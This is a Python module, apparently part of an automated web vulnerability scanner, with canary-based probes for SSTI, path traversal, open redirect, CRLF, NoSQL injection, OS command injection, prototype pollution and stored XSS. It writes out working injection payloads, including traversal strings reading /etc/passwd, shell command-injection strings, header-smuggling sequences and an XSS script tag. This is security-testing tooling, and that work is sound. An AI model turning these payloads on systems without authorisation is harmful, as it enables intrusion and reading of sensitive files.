"""
Differential probes — canary-based detection parity across bug classes.

We already had sharp differential probes for SQLi (``probe_sqli_params``) and XSS
(``probe_xss_reflection``): inject a controlled canary, look for a specific,
low-false-positive signal. Everything else (SSTI, path traversal, open redirect,
CRLF/header injection) fell back to nuclei + freeform LLM testing — higher
false-negative rate. This module brings those classes up to the same standard.

Each probe:
  * injects a **unique arithmetic/marker canary** so a hit is unambiguous (an
    engine evaluating ``{{1009*1013}}`` to ``1022117`` is proof, not a guess),
  * reports structured ``candidates`` the fireteam's finding extractor picks up,
  * uses an **injectable HTTP fetch** (default: ``scanners.run_send_http_request``)
    so the verdict logic is unit-tested against fixtures without a network.

The pure ``_*_hit`` verdict helpers carry the detection logic and are tested
directly; the ``run_*`` drivers just wire them to real requests per parameter.
"""
from __future__ import annotations

import logging
import json
import random
import re
from difflib import SequenceMatcher
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

logger = logging.getLogger("agent.probes")


def _similar(a: str, b: str) -> float:
    a, b = (a or "")[:6000], (b or "")[:6000]
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    return SequenceMatcher(None, a, b).ratio()

# Injectable HTTP: (method, url, headers, body) -> response dict with
# {status, headers, body, redirect_history, error}. Matches
# scanners.run_send_http_request's shape.
HttpFetch = Callable[[str, str, Dict[str, str], str], Dict[str, Any]]


def _default_http(method: str, url: str, headers: Dict[str, str], body: str) -> Dict[str, Any]:
    import json as _json
    import scanners
    return scanners.run_send_http_request(
        method=method, url=url, headers_json=_json.dumps(headers or {}),
        body=body, follow_redirects=False, bridge=None,
    )


def _params_of(url: str) -> List[str]:
    return [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)]


def _with_param(url: str, param: str, value: str) -> str:
    parts = urlparse(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    return urlunparse(parts._replace(query=urlencode(q)))


def _headers(headers_json: str | Dict[str, str] | None) -> Dict[str, str]:
    if isinstance(headers_json, dict):
        return {str(k): str(v) for k, v in headers_json.items()}
    try:
        parsed = json.loads(headers_json or "{}")
    except (TypeError, json.JSONDecodeError):
        parsed = {}
    return {str(k): str(v) for k, v in parsed.items()} if isinstance(parsed, dict) else {}


def _content_type(headers: Dict[str, str]) -> str:
    return next(
        (str(v).lower() for k, v in headers.items() if str(k).lower() == "content-type"),
        "",
    )


def _json_paths(value: Any, prefix: str = "") -> List[str]:
    paths: List[str] = []
    if isinstance(value, dict):
        for key, child in value.items():
            path = f"{prefix}.{key}" if prefix else str(key)
            if isinstance(child, (dict, list)):
                paths.extend(_json_paths(child, path))
            else:
                paths.append(path)
    return paths


def _set_json_path(value: Dict[str, Any], path: str, replacement: Any) -> bool:
    parts = [part for part in path.split(".") if part]
    current: Any = value
    for part in parts[:-1]:
        if not isinstance(current, dict) or part not in current:
            return False
        current = current[part]
    if not parts or not isinstance(current, dict) or parts[-1] not in current:
        return False
    current[parts[-1]] = replacement
    return True


def _parameter_specs(
    target_url: str,
    params: str,
    method: str,
    headers: Dict[str, str],
    body: str,
) -> List[str]:
    explicit = [p.strip() for p in params.split(",") if p.strip()]
    if explicit:
        return explicit
    query = [f"query:{p}" for p in _params_of(target_url)]
    if query:
        return query
    ctype = _content_type(headers)
    if "json" in ctype or (body or "").lstrip().startswith("{"):
        try:
            parsed = json.loads(body or "{}")
        except json.JSONDecodeError:
            parsed = {}
        if isinstance(parsed, dict):
            return [f"json:{path}" for path in _json_paths(parsed)]
    if method.upper() != "GET" and body:
        return [f"form:{key}" for key, _ in parse_qsl(body, keep_blank_values=True)]
    return []


def _split_spec(spec: str, method: str, headers: Dict[str, str], body: str) -> Tuple[str, str]:
    if ":" in spec and spec.split(":", 1)[0] in {
        "query", "form", "json", "graphql", "header", "cookie"
    }:
        return tuple(spec.split(":", 1))  # type: ignore[return-value]
    if method.upper() == "GET":
        return "query", spec
    if "json" in _content_type(headers) or (body or "").lstrip().startswith("{"):
        return "json", spec
    return "form", spec


def _mutate_request(
    target_url: str,
    method: str,
    headers: Dict[str, str],
    body: str,
    spec: str,
    replacement: Any,
    *,
    key_suffix: str = "",
) -> Tuple[str, str, Dict[str, str], str, str]:
    """Mutate one request input while preserving every other request field."""
    location, name = _split_spec(spec, method, headers, body)
    out_headers = dict(headers)
    out_url, out_body = target_url, body or ""
    if location == "query":
        out_url = _with_param(target_url, name + key_suffix, str(replacement))
    elif location == "form":
        pairs = parse_qsl(out_body, keep_blank_values=True)
        updated = False
        mutated = []
        for key, value in pairs:
            if key == name:
                mutated.append((key + key_suffix, str(replacement)))
                updated = True
            else:
                mutated.append((key, value))
        if not updated:
            mutated.append((name + key_suffix, str(replacement)))
        out_body = urlencode(mutated)
        if not _content_type(out_headers):
            out_headers["Content-Type"] = "application/x-www-form-urlencoded"
    elif location == "json":
        try:
            document = json.loads(out_body or "{}")
        except json.JSONDecodeError:
            document = {}
        if not isinstance(document, dict):
            document = {}
        _set_json_path(document, name, replacement)
        out_body = json.dumps(document, separators=(",", ":"))
        out_headers["Content-Type"] = "application/json"
    elif location == "graphql":
        try:
            document = json.loads(out_body or "{}")
        except json.JSONDecodeError:
            document = {}
        query = str(document.get("query") or "") if isinstance(document, dict) else ""
        query = re.sub(
            rf"({re.escape(name)}\s*:\s*)([\"'])(.*?)(\2)",
            lambda match: match.group(1) + match.group(2) + str(replacement) + match.group(2),
            query,
            count=1,
        )
        if isinstance(document, dict):
            document["query"] = query
        out_body = json.dumps(document, separators=(",", ":"))
        out_headers["Content-Type"] = "application/json"
    elif location == "header":
        out_headers[name] = str(replacement)
    elif location == "cookie":
        cookie_key = next((key for key in out_headers if key.lower() == "cookie"), "Cookie")
        cookies = dict(
            pair.strip().split("=", 1)
            for pair in out_headers.get(cookie_key, "").split(";")
            if "=" in pair
        )
        cookies[name] = str(replacement)
        out_headers[cookie_key] = "; ".join(f"{k}={v}" for k, v in cookies.items())
    return method.upper(), out_url, out_headers, out_body, location


def _headers_lower(resp: Dict[str, Any]) -> Dict[str, str]:
    hdrs = resp.get("headers") or {}
    if not isinstance(hdrs, dict):
        return {}
    return {str(k).lower(): str(v) for k, v in hdrs.items()}


# ---------------------------------------------------------------------------
# Pure verdict helpers (unit-tested directly)
# ---------------------------------------------------------------------------

def _ssti_hit(body: str, product: int, raw_payload_digits: str) -> bool:
    """True if the computed product appears (engine evaluated the expression)
    and it isn't merely the literal operands echoed back."""
    if not body:
        return False
    p = str(product)
    if p not in body:
        return False
    # Guard against coincidental echo: the operands concatenated shouldn't be
    # what we matched (product is distinct from the literal "a*b" digits).
    return p != raw_payload_digits


_TRAVERSAL_SIGNATURES: List[Tuple[str, str]] = [
    (r"root:.*?:0:0:", "unix /etc/passwd (root:...:0:0:)"),
    (r"\[fonts\]|\[extensions\]|for 16-bit app support", "windows win.ini"),
    (r"daemon:.*?:/usr/sbin", "unix /etc/passwd (daemon)"),
]


def _traversal_hit(body: str) -> Optional[str]:
    for pat, label in _TRAVERSAL_SIGNATURES:
        if re.search(pat, body or "", re.IGNORECASE):
            return label
    return None


def _open_redirect_hit(resp: Dict[str, Any], marker_host: str) -> Optional[str]:
    """True if the response redirects off-origin to the attacker marker host."""
    status = resp.get("status")
    hdrs = _headers_lower(resp)
    location = hdrs.get("location", "")
    if isinstance(status, int) and 300 <= status < 400 and location:
        host = urlparse(location if "//" in location else "//" + location.lstrip("/\\")).netloc
        if marker_host in (host or location):
            return f"Location header → {location}"
    # redirect chain (if the fetcher followed it)
    for h in resp.get("redirect_history") or []:
        if marker_host in str(h):
            return f"redirect chain → {h}"
    # client-side redirect in body
    body = resp.get("body") or ""
    if re.search(rf"(location\.(href|replace)|meta[^>]+refresh)[^>]*{re.escape(marker_host)}",
                 body, re.IGNORECASE):
        return "client-side redirect to marker host"
    return None


def _crlf_hit(resp: Dict[str, Any], marker_header: str, marker_value: str) -> bool:
    """True if an injected header materialized in the response headers."""
    hdrs = _headers_lower(resp)
    return hdrs.get(marker_header.lower(), "") == marker_value


# ---------------------------------------------------------------------------
# Drivers
# ---------------------------------------------------------------------------

_SSTI_TEMPLATES = ["{{{0}}}", "${{{0}}}", "#{{{0}}}", "${0}", "#{0}", "<%= {0} %>"]


def run_probe_ssti(target_url: str, params: str = "", method: str = "GET",
                   headers_json: str | Dict[str, str] = "{}", body: str = "",
                   fetch: Optional[HttpFetch] = None,
                   rng: Optional[random.Random] = None) -> Dict[str, Any]:
    http = fetch or _default_http
    r = rng or random.Random()
    a, b = r.choice([1009, 1013, 1019]), r.choice([1021, 1031, 1033])
    product = a * b
    expr = f"{a}*{b}"
    request_headers = _headers(headers_json)
    param_list = _parameter_specs(target_url, params, method, request_headers, body)
    candidates: List[Dict[str, Any]] = []
    if not param_list:
        return {"probe": "ssti", "target": target_url, "candidates": [],
                "note": "no request parameters to test; pass typed params such as query:q or json:name"}
    for param in param_list:
        for tmpl in _SSTI_TEMPLATES:
            payload = tmpl.format(expr)
            req_method, url, req_headers, req_body, location = _mutate_request(
                target_url, method, request_headers, body, param, payload
            )
            resp = http(req_method, url, req_headers, req_body)
            if resp.get("error"):
                continue
            if _ssti_hit(resp.get("body") or "", product, f"{a}{b}"):
                candidates.append({
                    "title": f"Server-Side Template Injection in '{param}'",
                    "vuln_type": "ssti", "severity": "high", "url": url,
                    "param": param, "location": location, "method": req_method,
                    "payload": payload, "request_body": req_body,
                    "evidence": f"{expr} evaluated to {product} in the response",
                    "confirmed": True,
                })
                break  # this param confirmed; move on
    return {"probe": "ssti", "target": target_url,
            "tested_params": param_list, "candidates": candidates}


_TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
]


def run_probe_path_traversal(target_url: str, params: str = "", method: str = "GET",
                             headers_json: str | Dict[str, str] = "{}", body: str = "",
                             fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
    http = fetch or _default_http
    request_headers = _headers(headers_json)
    param_list = _parameter_specs(target_url, params, method, request_headers, body)
    candidates: List[Dict[str, Any]] = []
    if not param_list:
        return {"probe": "path_traversal", "target": target_url, "candidates": [],
                "note": "no request parameters to test; pass params=… (e.g. form:file,json:path)"}
    for param in param_list:
        for payload in _TRAVERSAL_PAYLOADS:
            req_method, url, req_headers, req_body, location = _mutate_request(
                target_url, method, request_headers, body, param, payload
            )
            resp = http(req_method, url, req_headers, req_body)
            if resp.get("error"):
                continue
            label = _traversal_hit(resp.get("body") or "")
            if label:
                candidates.append({
                    "title": f"Path Traversal in '{param}'",
                    "vuln_type": "path_traversal", "severity": "high", "url": url,
                    "param": param, "location": location, "method": req_method,
                    "payload": payload, "request_body": req_body,
                    "evidence": f"leaked file signature: {label}", "confirmed": True,
                })
                break
    return {"probe": "path_traversal", "target": target_url,
            "tested_params": param_list, "candidates": candidates}


_REDIRECT_MARKER = "aeg-redir-canary.example"
_REDIRECT_PAYLOADS = [
    f"https://{_REDIRECT_MARKER}/",
    f"//{_REDIRECT_MARKER}/",
    f"https:/{_REDIRECT_MARKER}",
    f"/\\{_REDIRECT_MARKER}",
    f"https://trusted@{_REDIRECT_MARKER}/",
]


def run_probe_open_redirect(target_url: str, params: str = "", method: str = "GET",
                            headers_json: str | Dict[str, str] = "{}", body: str = "",
                            fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
    http = fetch or _default_http
    hint = ("next", "url", "redirect", "return", "returnUrl", "dest", "destination",
            "continue", "r", "u", "to")
    request_headers = _headers(headers_json)
    param_list = _parameter_specs(target_url, params, method, request_headers, body)
    if not param_list:
        param_list = [f"query:{name}" for name in hint]
    candidates: List[Dict[str, Any]] = []
    for param in param_list:
        for payload in _REDIRECT_PAYLOADS:
            req_method, url, req_headers, req_body, location = _mutate_request(
                target_url, method, request_headers, body, param, payload
            )
            resp = http(req_method, url, req_headers, req_body)
            if resp.get("error"):
                continue
            why = _open_redirect_hit(resp, _REDIRECT_MARKER)
            if why:
                candidates.append({
                    "title": f"Open Redirect via '{param}'",
                    "vuln_type": "open_redirect", "severity": "medium", "url": url,
                    "param": param, "location": location, "method": req_method,
                    "payload": payload, "request_body": req_body,
                    "evidence": why, "confirmed": True,
                })
                break
    return {"probe": "open_redirect", "target": target_url,
            "tested_params": param_list, "candidates": candidates}


def run_probe_crlf(target_url: str, params: str = "", method: str = "GET",
                   headers_json: str | Dict[str, str] = "{}", body: str = "",
                   fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
    http = fetch or _default_http
    marker_hdr, marker_val = "X-Aeg-Inj", "crlf" + "1337"
    injections = [
        f"%0d%0a{marker_hdr}:%20{marker_val}",
        f"%0d%0a%20{marker_hdr}:{marker_val}",
        f"\r\n{marker_hdr}: {marker_val}",
        f"%E5%98%8D%E5%98%8A{marker_hdr}:%20{marker_val}",  # unicode CRLF
    ]
    request_headers = _headers(headers_json)
    param_list = _parameter_specs(target_url, params, method, request_headers, body)
    candidates: List[Dict[str, Any]] = []
    if not param_list:
        return {"probe": "crlf", "target": target_url, "candidates": [],
                "note": "no request parameters to test; pass typed params such as query:q or form:name"}
    for param in param_list:
        for payload in injections:
            req_method, url, req_headers, req_body, location = _mutate_request(
                target_url, method, request_headers, body, param, payload
            )
            resp = http(req_method, url, req_headers, req_body)
            if resp.get("error"):
                continue
            if _crlf_hit(resp, marker_hdr, marker_val):
                candidates.append({
                    "title": f"CRLF / HTTP Response Header Injection in '{param}'",
                    "vuln_type": "crlf", "severity": "medium", "url": url,
                    "param": param, "location": location, "method": req_method,
                    "payload": payload, "request_body": req_body,
                    "evidence": f"injected header {marker_hdr}: {marker_val} reflected",
                    "confirmed": True,
                })
                break
    return {"probe": "crlf", "target": target_url,
            "tested_params": param_list, "candidates": candidates}


# ---------------------------------------------------------------------------
# NoSQL injection (boolean-differential, MongoDB-style operator injection)
# ---------------------------------------------------------------------------

def _bool_diff_hit(base: Dict[str, Any], t: Dict[str, Any], f: Dict[str, Any]) -> bool:
    """True if the TRUE payload behaves like the baseline and the FALSE payload
    diverges — the classic boolean-injection signal."""
    if any(r.get("error") for r in (base, t, f)):
        return False
    b_body, t_body, f_body = (base.get("body") or "", t.get("body") or "", f.get("body") or "")
    true_like_base = (t.get("status") == base.get("status")
                      and _similar(b_body, t_body) >= 0.95)
    false_status_diff = f.get("status") != base.get("status")
    false_body_diff = _similar(b_body, f_body) < 0.90
    return true_like_base and (false_status_diff or false_body_diff)


# (true-payload, false-payload) pairs. Operator-style first, then string boolean.
_NOSQL_PAIRS = [
    ("[$ne]=aegdoesnotexist", "[$eq]=aegdoesnotexist"),
    ("[$regex]=.*", "[$regex]=^aegnomatch$"),
    ("'||'1'=='1", "'||'1'=='2"),
]


def run_probe_nosql(target_url: str, params: str = "", method: str = "GET",
                    headers_json: str | Dict[str, str] = "{}", body: str = "",
                    fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
    """Boolean-differential NoSQL (Mongo-style operator) injection probe."""
    http = fetch or _default_http
    request_headers = _headers(headers_json)
    param_list = _parameter_specs(target_url, params, method, request_headers, body)
    if not param_list:
        return {"probe": "nosql", "target": target_url, "candidates": [],
                "note": "no request parameters to test; pass typed params such as form:user or json:user"}
    candidates: List[Dict[str, Any]] = []
    for param in param_list:
        base_req = _mutate_request(
            target_url, method, request_headers, body, param, "aegbase"
        )
        base = http(base_req[0], base_req[1], base_req[2], base_req[3])
        for true_p, false_p in _NOSQL_PAIRS:
            # operator payloads mutate the param KEY (param[$ne]=…); string ones the value
            location, _ = _split_spec(param, method, request_headers, body)
            if true_p.startswith("[") and location == "json":
                t_req = _mutate_request(
                    target_url, method, request_headers, body, param,
                    {true_p[1:true_p.index("]")]: true_p.split("=", 1)[1]},
                )
                f_req = _mutate_request(
                    target_url, method, request_headers, body, param,
                    {false_p[1:false_p.index("]")]: false_p.split("=", 1)[1]},
                )
            elif true_p.startswith("["):
                t_req = _mutate_request(
                    target_url, method, request_headers, body, param,
                    true_p.split("=", 1)[1], key_suffix=true_p.split("=", 1)[0],
                )
                f_req = _mutate_request(
                    target_url, method, request_headers, body, param,
                    false_p.split("=", 1)[1], key_suffix=false_p.split("=", 1)[0],
                )
            else:
                t_req = _mutate_request(target_url, method, request_headers, body, param, true_p)
                f_req = _mutate_request(target_url, method, request_headers, body, param, false_p)
            t = http(t_req[0], t_req[1], t_req[2], t_req[3])
            f = http(f_req[0], f_req[1], f_req[2], f_req[3])
            if _bool_diff_hit(base, t, f):
                candidates.append({
                    "title": f"NoSQL injection (boolean-differential) in '{param}'",
                    "vuln_type": "nosql", "severity": "high", "url": t_req[1],
                    "param": param, "location": location, "method": t_req[0],
                    "payload": true_p, "request_body": t_req[3],
                    "evidence": "true/false operator payloads produced a boolean-"
                                "differential response", "confirmed": True,
                })
                break
    return {"probe": "nosql", "target": target_url,
            "tested_params": param_list, "candidates": candidates}


# ---------------------------------------------------------------------------
# OS command injection (response marker; non-destructive)
# ---------------------------------------------------------------------------

def run_probe_command_injection(
    target_url: str,
    params: str = "",
    method: str = "GET",
    headers_json: str | Dict[str, str] = "{}",
    body: str = "",
    fetch: Optional[HttpFetch] = None,
    rng: Optional[random.Random] = None,
) -> Dict[str, Any]:
    """Confirm command execution by printing a unique inert response marker."""
    http = fetch or _default_http
    marker = "AEGCMD" + str((rng or random.Random()).randint(100000, 999999))
    request_headers = _headers(headers_json)
    param_list = _parameter_specs(target_url, params, method, request_headers, body)
    if not param_list:
        return {
            "probe": "command_injection", "target": target_url, "candidates": [],
            "note": "no request parameters to test; pass typed params such as form:host or json:command",
        }
    payloads = [
        f";printf {marker}",
        f"|printf {marker}",
        f"$(printf {marker})",
        f"& echo {marker}",
    ]
    candidates: List[Dict[str, Any]] = []
    baseline = http(method.upper(), target_url, request_headers, body or "")
    baseline_body = baseline.get("body") or ""
    for param in param_list:
        for payload in payloads:
            req_method, url, req_headers, req_body, location = _mutate_request(
                target_url, method, request_headers, body, param, payload
            )
            response = http(req_method, url, req_headers, req_body)
            response_body = response.get("body") or ""
            if not response.get("error") and marker in response_body and marker not in baseline_body:
                candidates.append({
                    "title": f"OS Command Injection in '{param}'",
                    "vuln_type": "command_injection",
                    "severity": "critical",
                    "url": url,
                    "param": param,
                    "location": location,
                    "method": req_method,
                    "payload": payload,
                    "request_body": req_body,
                    "evidence": f"server response contained command output marker {marker}",
                    "confirmed": True,
                })
                break
    return {
        "probe": "command_injection", "target": target_url,
        "tested_params": param_list, "candidates": candidates,
    }


# ---------------------------------------------------------------------------
# Prototype pollution (server-side, via query + JSON body)
# ---------------------------------------------------------------------------

def _pp_hit(base: Dict[str, Any], polluted: Dict[str, Any], marker_val: str) -> Optional[str]:
    if polluted.get("error"):
        return None
    b_body = base.get("body") or ""
    p_body = polluted.get("body") or ""
    if marker_val in p_body and marker_val not in b_body:
        return "polluted property reflected in response"
    if base.get("status") == 200 and polluted.get("status") in (500, 502):
        return f"pollution caused a server error (HTTP {polluted.get('status')})"
    return None


def run_probe_prototype_pollution(target_url: str, params: str = "",
                                  fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
    """Server-side prototype-pollution probe (query + JSON body vectors)."""
    http = fetch or _default_http
    marker_key, marker_val = "aegpp", "polluted" + "1337"
    base = http("GET", target_url, {}, "")
    candidates: List[Dict[str, Any]] = []
    vectors = [
        ("GET", _with_param(_with_param(target_url, f"__proto__[{marker_key}]", marker_val),
                            f"constructor[prototype][{marker_key}]", marker_val), {}, ""),
        ("POST", target_url, {"Content-Type": "application/json"},
         '{"__proto__":{"%s":"%s"}}' % (marker_key, marker_val)),
        ("POST", target_url, {"Content-Type": "application/json"},
         '{"constructor":{"prototype":{"%s":"%s"}}}' % (marker_key, marker_val)),
    ]
    for method, url, hdrs, body in vectors:
        polluted = http(method, url, hdrs, body)
        why = _pp_hit(base, polluted, marker_val)
        if why:
            candidates.append({
                "title": "Prototype Pollution (server-side)",
                "vuln_type": "prototype_pollution", "severity": "medium", "url": url,
                "payload": body or url, "evidence": why, "confirmed": True,
            })
            break
    return {"probe": "prototype_pollution", "target": target_url, "candidates": candidates}


# ---------------------------------------------------------------------------
# Stored / second-order XSS (stateful: inject at A, observe at B)
# ---------------------------------------------------------------------------

def _stored_xss_hit(body: str, marker: str) -> Optional[str]:
    """True if the marker reflects with its script payload intact (unescaped)."""
    if not body or marker not in body:
        return None
    # find the marker and inspect the surrounding raw payload
    idx = body.find(marker)
    window = body[max(0, idx - 60): idx + 60]
    if "<svg" in window.lower() and "onload" in window.lower():
        return "canary reflected with unescaped <svg onload> payload"
    if f"<script" in window.lower():
        return "canary reflected inside an unescaped <script> context"
    return None


def run_probe_stored_xss(inject_url: str, observe_urls: str, params: str = "",
                         method: str = "GET", body: str = "",
                         fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
    """Two-phase stored / second-order XSS probe: inject a canary at one endpoint,
    then check whether it reflects unescaped at other (observe) endpoints.

    Args:
        inject_url: endpoint that stores input.
        observe_urls: comma-separated URLs to re-fetch and inspect.
        params: params on inject_url to seed with the canary (default: all query params).
        method: inject method (GET/POST).
        body: inject body (for POST); ``AEGMARK`` in it is replaced with the canary.
    """
    http = fetch or _default_http
    marker = "aegstored" + str(random.randint(10000, 99999))
    payload = f'"><svg/onload=alert(1)>{marker}'
    # Phase 1 — inject
    if method.upper() == "POST":
        http("POST", inject_url, {"Content-Type": "application/x-www-form-urlencoded"},
             (body or f"comment={payload}").replace("AEGMARK", payload))
    else:
        param_list = [p.strip() for p in params.split(",") if p.strip()] or _params_of(inject_url) or ["q"]
        url = inject_url
        for p in param_list:
            url = _with_param(url, p, payload)
        http("GET", url, {}, "")
    # Phase 2 — observe
    candidates: List[Dict[str, Any]] = []
    targets = [u.strip() for u in observe_urls.split(",") if u.strip()] or [inject_url]
    for obs in targets:
        resp = http("GET", obs, {}, "")
        why = _stored_xss_hit(resp.get("body") or "", marker)
        if why:
            candidates.append({
                "title": "Stored / Second-Order XSS",
                "vuln_type": "stored_xss", "severity": "high", "url": obs,
                "inject_url": inject_url, "payload": payload,
                "evidence": f"{why} (observed at {obs})", "confirmed": True,
            })
    return {"probe": "stored_xss", "inject_url": inject_url,
            "observed": targets, "candidates": candidates}


__all__ = [
    "run_probe_ssti",
    "run_probe_path_traversal",
    "run_probe_open_redirect",
    "run_probe_crlf",
    "run_probe_nosql",
    "run_probe_command_injection",
    "run_probe_prototype_pollution",
    "run_probe_stored_xss",
    "_ssti_hit",
    "_traversal_hit",
    "_open_redirect_hit",
    "_crlf_hit",
    "_bool_diff_hit",
    "_pp_hit",
    "_stored_xss_hit",
]
